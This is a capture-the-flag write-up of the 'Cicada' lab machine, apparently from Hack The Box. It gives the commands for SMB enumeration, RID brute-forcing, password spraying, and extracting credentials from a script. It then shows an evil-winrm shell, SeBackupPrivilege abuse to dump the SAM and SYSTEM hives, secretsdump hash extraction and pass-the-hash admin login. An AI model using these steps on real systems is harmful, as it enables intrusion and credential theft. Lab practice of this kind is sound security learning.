<img src="Imgs/image1.png" alt="error loading image"> 

## Cicada 

**Step1:**

Ping to check everything is ok 

`Command: ping <ip address>`

<img src="Imgs/image2.jpg" alt="error loading image">

Now we run an Nmap command to find an open ports 

`Commad: nmap 10.10.11.35`

<img src="Imgs/image3.jpg" alt="error loading image"> 

Here we can see number of ports are open 

Let try a service version scan to check running service 

`Command: nmap -sV 10.10.11.35`

<img src="Imgs/image4.jpg" alt="error loading image"> 

Here we can see different port with the service running 

Let try with smb enumeration 

First check with nmap scripting engine 

`Command: nmap -p 445 10.10.11.35 --script=smb-enum-services`

<img src="Imgs/image5.jpg" alt="error loading image"> 

Here we are not able to find a successful result 

Now we check if we are are to check smb shares 

`Command: smbclient -L //10.10.11.35/ -N`

<img src="Imgs/image6.jpg" alt="error loading image"> 

Yes we can see different type of shares 

I have try to log into share and done but not able to run a command 

`Command: smbclient //10.10.11.35/DEV -N`

<img src="Imgs/image7.jpg" alt="error loading image"> 

In HR Share I found a useful Notice from HR 

`Command: smbclient //10.10.11.35/HR -N `

<img src="Imgs/image8.jpg" alt="error loading image"> 

After opening the test file I found a default password but no user. 

Cat file

<img src="Imgs/image9.jpg" alt="error loading image"> 


Now we bruteforce rid to find different user account. Using username guest and password 
empty. 

`Command: crackmapexec smb  10.10.11.35  -u "guest" -p '' --rid-brute `

<img src="Imgs/image10.jpg" alt="error loading image"> 

And we have found different user account. 

Now we create a username.txt of the enumerated user and set password to default password 
found from the lab. 

Using Metasploit module smb_login 

```msfconsole
Use auxiliary/scanner/smb/smb_login 
set USER_FILE /home/kali/username.txt 
set SMBPASS <password here> 
run
```

<img src="Imgs/image11.jpg" alt="error loading image"> 

<img src="Imgs/image12.jpg" alt="error loading image"> 

From the result we found a username for the default password. 

Using this username and password I try to open different shares but still not found any thing. 
So i decide to further enumerate users with this username and password but found nothing  

```
Command: crackmapexec smb  10.10.11.35  -u "michael.wrightson" -p 
'<password here>' --rid-brute 
```

<img src="Imgs/image13.jpg" alt="error loading image"> 

So I decide to use netexec to brute force rid and now I found a password for user. 

```
Command  netexec smb 10.10.11.35 -u michael.wrightson -p  '<password here>' --users --rid-brute 
```

<img src="Imgs/image14.jpg" alt="error loading image"> 

Now use username and password to access the share 

```
Command: smbclient \\\\10.10.11.35\\DEV -U david.orelious 
Password: <password here> 
```

<img src="Imgs/image15.jpg" alt="error loading image"> 

In DEV share I found a script on opening the file I found username for and a password. 

`Command: cat Backuo_Script.ps1 `

<img src="Imgs/image16.jpg" alt="error loading image"> 

Using this username and password we access share C$ and here I found a user flag. 

`Command: smbclient \\\\10.10.11.35\\C$ -U emily.oscars `

`Password: <password here>`

<img src="Imgs/image17.jpg" alt="error loading image"> 

Under \Users\emily.oscars.CICADA\Desktop\

<img src="Imgs/image18.jpg" alt="error loading image"> 

User Flag

<img src="Imgs/image19.jpg" alt="error loading image"> 

Now we have to elevate priviledge on window sytem. For thi we use window remote 
management tool  

`Command: evil-winrm -i 10.10.11.35 -u emily.oscars -p '<password here>' `

It will open a powershell session on a remote machine

<img src="Imgs/image20.jpg" alt="error loading image"> 

Now we check our current privilege 

`Command:  whoami /priv`

<img src="Imgs/image21.jpg" alt="error loading image"> 

Now I found a Brilliant writeup to elevate priviledge using 
[SeBackupPrivilege](https://starlox.medium.com/windows-privesc-with-sebackupprivilege-enable-b9e949219caf) 

let check with user account detail 

command: net user emily.oscars

<img src="Imgs/image22.jpg" alt="error loading image"> 

Now we use this github repositiory to install DLL files 

`https://github.com/giuliano108/SeBackupPrivilege `

<img src="Imgs/image23.jpg" alt="error loading image"> 

Once file are downloaded on our sytem we will upload it in a temp folder. If no then we make 
a temp folder 

Command: upload /file/to/path 

<img src="Imgs/image24.jpg" alt="error loading image"> 

After both dll files are uploaded. We load a powershell module to abuse SeBackupPrivilege. 

```
Command: 
Import-Module .\SeBackupPrivilegeCmdLets.dll 
Import-Module .\SeBackupPrivilegeUtils.dll
```

<img src="Imgs/image25.jpg" alt="error loading image"> 

Now we move the sam and system files from HKLM registry hiver to 

C:\Users\emily.oscars\temp\sam 

```
Command: 
reg save hklm\sam C:\Users\emily.oscars\temp\sam 
reg save hklm\system C:\Users\emily.oscars\temp\system
```

<img src="Imgs/image26.jpg" alt="error loading image">  

Finally download these files on our system 

```
Command:  
download sam 
download system 
```

<img src="Imgs/image27.jpg" alt="error loading image"> 

Usinf secretdump.py we extract NTLM hashes 

`Command: python3 secretsdump.py -sam sam -system system LOCAL `

<img src="Imgs/image28.jpg" alt="error loading image"> 

Again go to remote poweshell using user admin and a hash 
```
Command: sudo evil-winrm  -i 10.10.11.35 -u administrator -H <Admin hash> 
```
<img src="Imgs/image29.jpg" alt="error loading image"> 

And under Desktop we found a root.txt file. 